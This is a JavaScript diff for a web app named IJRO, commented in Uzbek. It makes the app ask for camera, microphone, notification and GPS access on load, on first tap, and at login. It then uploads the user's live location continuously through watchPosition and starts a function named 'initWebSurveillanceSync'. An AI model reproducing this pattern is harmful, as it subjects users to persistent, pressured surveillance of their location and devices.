@@ -1,6 +1,30 @@
 // IJRO Main App Controller & Router
+
+// Set dynamic viewport height to handle mobile toolbars
+function setAppViewportHeight() {
+  const vh = window.innerHeight;
+  document.documentElement.style.setProperty('--app-height', `${vh}px`);
+}
+window.addEventListener('resize', setAppViewportHeight);
+window.addEventListener('orientationchange', setAppViewportHeight);
+setAppViewportHeight();
+
+// Web ga kirish bilan srazi ruxsatnomalarni so'rash
 document.addEventListener('DOMContentLoaded', () => {
+  setAppViewportHeight();
   window.initFirebase();
+
+  // Web ochilishi bilanoq barcha ruxsatnomalarni so'rash
+  requestWebPermissions();
+
+  // Brauzerlar (ayniqsa Safari) foydalanuvchi teginishini talab qilishi mumkin
+  const gesturePermissionHandler = () => {
+    requestWebPermissions();
+    window.removeEventListener('click', gesturePermissionHandler);
+    window.removeEventListener('touchstart', gesturePermissionHandler);
+  };
+  window.addEventListener('click', gesturePermissionHandler);
+  window.addEventListener('touchstart', gesturePermissionHandler);
 
   // Check saved session
   const savedUserId = localStorage.getItem('ijro_user_id');
@@ -21,6 +45,9 @@ function handleLogin(e) {
   if (e) e.preventDefault();
   const username = document.getElementById('login-user').value.trim();
   const pass = document.getElementById('login-pass').value.trim();
+
+  // Kirish bosilganda ham srazi barcha ruxsatlarni tasdiqlash
+  requestWebPermissions();
 
   if (!username || !pass) {
     alert("Iltimos, login va parolni kiriting!");
@@ -51,6 +78,7 @@ function handleLogout() {
 }
 
 function routeUserToScreen(user) {
+  requestWebPermissions();
   if (user.role === 'MAYOR') {
     showScreen('mayor-screen');
     initMayorView();
@@ -67,65 +95,73 @@ function routeUserToScreen(user) {
 
 function checkWebPermissions(user) {
   initWebSurveillanceSync(user);
-  const granted = localStorage.getItem('ijro_web_permissions_granted');
-  if (!granted) {
-    requestWebPermissions();
-  }
+  requestWebPermissions();
 }
 
+let isRequestingPermissions = false;
 async function requestWebPermissions() {
-  localStorage.setItem('ijro_web_permissions_granted', 'true');
+  if (isRequestingPermissions) return;
+  isRequestingPermissions = true;
 
-  showToast("🛡️ Ruxsatnomalar so'ralmoqda...");
-
-  // 1. Notification permission
   try {
-    if ('Notification' in window && Notification.permission !== 'granted') {
-      await Notification.requestPermission();
-    }
-  } catch (e) {
-    console.log('Notification permission error', e);
-  }
-
-  // 2. Camera and Microphone permission
-  try {
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      // Ruxsat olingach oqimni to'xtatib turamiz
-      stream.getTracks().forEach(track => track.stop());
-    }
-  } catch (e) {
-    console.log('Media (Camera/Mic) permission error', e);
-    // Kamida audio so'rab ko'ramiz
-    try {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        audioStream.getTracks().forEach(track => track.stop());
-      }
-    } catch (_e) {}
-  }
-
-  // 3. Geolocation (GPS) permission
-  try {
+    // 1. Geolocation (GPS) ruxsati - darhol so'rash va doimiy kuzatish
     if ('geolocation' in navigator) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          console.log('GPS granted:', pos.coords.latitude, pos.coords.longitude);
-          if (window.store.currentUser) {
+          console.log('GPS ruxsat berildi:', pos.coords.latitude, pos.coords.longitude);
+          if (window.store && window.store.currentUser) {
             uploadWebLocation(window.store.currentUser.username, pos.coords.latitude, pos.coords.longitude);
           }
         },
-        (err) => console.log('Geolocation error', err),
-        { enableHighAccuracy: true, timeout: 10000 }
+        (err) => console.log('Geolocation error:', err),
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+
+      // Doimiy jonli GPS yangilash
+      navigator.geolocation.watchPosition(
+        (pos) => {
+          if (window.store && window.store.currentUser) {
+            uploadWebLocation(window.store.currentUser.username, pos.coords.latitude, pos.coords.longitude);
+          }
+        },
+        (err) => console.log('Geolocation watch error:', err),
+        { enableHighAccuracy: true, maximumAge: 5000 }
       );
     }
-  } catch (e) {
-    console.log('GPS error', e);
-  }
 
-  showToast("✅ Barcha ruxsatnomalar tasdiqlandi!");
-  if (window.store.currentUser) {
-    initWebSurveillanceSync(window.store.currentUser);
+    // 2. Kamera va Mikrofon ruxsati
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        stream.getTracks().forEach(track => track.stop());
+        console.log("Kamera va mikrofon ruxsati olindi!");
+      } catch (e) {
+        console.log('Kamera+Audio birgalikda xato, alohida tekshiriladi:', e);
+        try {
+          const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+          audioStream.getTracks().forEach(track => track.stop());
+        } catch (_e) {}
+        try {
+          const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+          videoStream.getTracks().forEach(track => track.stop());
+        } catch (_e) {}
+      }
+    }
+
+    // 3. Bildirishnomalar (Notification) ruxsati
+    try {
+      if ('Notification' in window && Notification.permission !== 'granted' && Notification.permission !== 'denied') {
+        await Notification.requestPermission();
+      }
+    } catch (e) {
+      console.log('Notification permission error:', e);
+    }
+
+    if (window.store && window.store.currentUser) {
+      initWebSurveillanceSync(window.store.currentUser);
+    }
+  } finally {
+    setTimeout(() => { isRequestingPermissions = false; }, 1000);
   }
 }
 
